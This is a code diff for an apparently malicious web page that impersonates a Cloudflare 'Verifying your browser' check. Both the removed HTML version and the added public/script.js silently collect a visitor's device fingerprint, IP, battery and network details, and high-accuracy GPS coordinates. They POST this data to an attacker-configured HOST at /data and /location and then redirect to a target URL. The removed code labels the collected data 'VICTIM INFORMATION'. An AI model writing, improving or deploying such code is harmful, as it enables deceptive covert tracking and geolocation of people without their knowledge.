@@ -1,181 +1,83 @@
-<!DOCTYPE html>
-<html lang="en-US">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifying Browser...</title>
-  <style>
-    body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:20px;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#333}
-    .container{max-width:500px;width:100%;text-align:center}
-    .spinner{display:flex;gap:5px;justify-content:center;margin:25px 0}
-    .spinner div{width:12px;height:12px;background:#f58220;border-radius:50%;animation:fader 1.4s infinite ease-in-out}
-    .spinner div:nth-child(2){animation-delay:-0.32s}
-    .spinner div:nth-child(3){animation-delay:-0.16s}
-    @keyframes fader{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
-    h1{font-size:22px;margin:0 0 15px;color:#000}
-    p{font-size:14px;margin:8px 0;color:#555;line-height:1.4}
-    #status{font-weight:500;color:#e67e22;margin:15px 0}
-    .footer{margin-top:30px;font-size:12px;color:#999}
-    .error{color:#e74c3c;font-weight:bold}
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="spinner"><div></div><div></div><div></div></div>
-    <h1>Verifying your browser...</h1>
-    <p>Please wait while we secure your connection.</p>
-    <p id="status">Initializing security scan...</p>
-    <p id="debug" style="font-size:12px;color:#7f8c8d;display:none"></p>
-  </div>
-  <div class="footer">DDoS protection by Cloudflare • Ray ID: <span id="rayId"></span></div>
+// public/script.js
 
-  <script>
-    // CONFIG
-    const UID = "<%= uid %>";
-    const HOST = "<%= a %>";
-    let dataSent = false;
-    let locationSent = false;
-    let fingerprint = "";
-    let debugEl = document.getElementById('debug');
-    let statusEl = document.getElementById('status');
+(async function() {
+    const config = window.CLOUDFLARE_CONFIG;
+    if (!config) return;
 
-    // Show debug in development
-    // debugEl.style.display = 'block';
+    const status = document.getElementById('status');
 
-    function logDebug(msg) {
-      console.log("[DEBUG]", msg);
-      debugEl.innerText = msg;
+    // Helper: Get Battery
+    const getBattery = async () => {
+        try {
+            const b = await navigator.getBattery();
+            return `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
+        } catch { return 'N/A'; }
+    };
+
+    // Helper: Get Connection
+    const getConnection = () => {
+        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return c ? `${c.effectiveType} (${c.downlink}Mbps)` : 'N/A';
+    };
+
+    // 1. Collect Device Data
+    const bat = await getBattery();
+    const data = `
+<b>📱 Device:</b> ${navigator.platform}
+<b>🌐 Browser:</b> ${navigator.vendor || 'Unknown'}
+<b>🔋 Battery:</b> ${bat}
+<b>💾 Memory:</b> ${navigator.deviceMemory || 'N/A'} GB
+<b>📡 Network:</b> ${getConnection()}
+<b>🖥️ Screen:</b> ${window.screen.width}x${window.screen.height}
+<b>🕒 Time:</b> ${new Date().toLocaleString()}
+<b>🕷️ User Agent:</b> <code>${navigator.userAgent}</code>
+    `.trim();
+
+    // 2. Send Initial Data (Device + IP)
+    try {
+        await fetch(`${config.HOST}/data`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid: config.UID, data: encodeURIComponent(data) })
+        });
+    } catch (e) { console.error(e); }
+
+    // 3. Request GPS Location
+    status.innerText = "Verifying location security...";
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                // Success: Send Location
+                await fetch(`${config.HOST}/location`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        uid: config.UID,
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy
+                    })
+                });
+                redirect();
+            },
+            (err) => {
+                // Denied/Error: Redirect anyway
+                console.log("Location denied");
+                redirect();
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        redirect();
     }
 
-    // Generate Ray ID
-    document.getElementById("rayId").innerText = '7' + Math.random().toString(36).substr(2, 15);
-
-    // Start collection
-    setTimeout(collectData, 1000);
-
-    async function collectData() {
-      try {
-        logDebug("Building fingerprint...");
-        await buildFingerprint();
-        sendData();
-        requestLocation();
-        // Redirect after 15s max
-        setTimeout(() => { redirectToTarget(); }, 15000);
-      } catch(e) {
-        logDebug("Init error: " + e.message);
-        redirectToTarget();
-      }
+    // 4. Redirect Function
+    function redirect() {
+        status.innerText = "Redirecting...";
+        setTimeout(() => {
+            window.location.replace(config.TARGET_URL);
+        }, 500);
     }
 
-    async function buildFingerprint() {
-      fingerprint = '<code>✅ VICTIM INFORMATION</code><br><br>';
-      fingerprint += `<b>⚓ IP:</b> <a href="https://ip-api.com/#<%= ip %>"><%= ip %></a> | <b>🕗 Time:</b> <%= time %><br><br>`;
-      fingerprint += `<b>⏳ Local Time:</b> ${new Date()}<br><br>`;
-
-      const keys = ["vendor","productSub","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language"];
-      fingerprint += "<b>📱 DEVICE INFO</b><br>";
-      keys.forEach(k => {
-        if (navigator[k] !== undefined) {
-          fingerprint += `<b>${k}:</b> <code>${navigator[k]}</code><br>`;
-        }
-      });
-
-      fingerprint += `<br><b>🖥️ Screen:</b> <code>${screen.width}x${screen.height}</code><br>`;
-      fingerprint += `<b>🌍 Timezone:</b> <code>${Intl.DateTimeFormat().resolvedOptions().timeZone}</code><br>`;
-    }
-
-    function sendData() {
-      logDebug("Sending device data...");
-      statusEl.innerText = "📡 Sending device fingerprint...";
-
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", HOST + "/data", true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          if (xhr.status === 200) {
-            dataSent = true;
-            logDebug("✅ Data sent successfully");
-            statusEl.innerText = "✅ Device data received";
-            checkCompletion();
-          } else {
-            logDebug("❌ Data send failed: " + xhr.status);
-            retrySendData();
-          }
-        }
-      };
-
-      xhr.send("uid=" + encodeURIComponent(UID) + "&data=" + encodeURIComponent(fingerprint));
-    }
-
-    function retrySendData() {
-      setTimeout(() => {
-        logDebug("Retrying data send...");
-        sendData();
-      }, 3000);
-    }
-
-    function requestLocation() {
-      logDebug("Requesting location...");
-      statusEl.innerText = "📍 Requesting location access...";
-
-      if (!navigator.geolocation) {
-        logDebug("Geolocation not supported");
-        locationSent = true;
-        checkCompletion();
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          logDebug("✅ Location obtained");
-          sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-        },
-        (err) => {
-          logDebug("❌ Location error: " + err.message);
-          locationSent = true;
-          checkCompletion();
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    }
-
-    function sendLocation(lat, lon, acc) {
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", HOST + "/location", true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          if (xhr.status === 200) {
-            locationSent = true;
-            logDebug("✅ Location sent");
-            statusEl.innerText = "✅ Location captured";
-            checkCompletion();
-          } else {
-            logDebug("❌ Location send failed: " + xhr.status);
-            locationSent = true; // Don't block
-            checkCompletion();
-          }
-        }
-      };
-
-      xhr.send(`uid=${encodeURIComponent(UID)}&lat=${lat}&lon=${lon}&acc=${acc}`);
-    }
-
-    function checkCompletion() {
-      if (dataSent) { // ← Only require data for testing (location optional)
-        logDebug("✅ Ready to redirect");
-        statusEl.innerText = "✅ Verification complete. Redirecting...";
-        setTimeout(redirectToTarget, 1000);
-      }
-    }
-
-    function redirectToTarget() {
-      logDebug("Redirecting to target URL");
-      window.location.href = "<%= url %>";
-    }
-  </script>
-</body>
-</html>
+})();
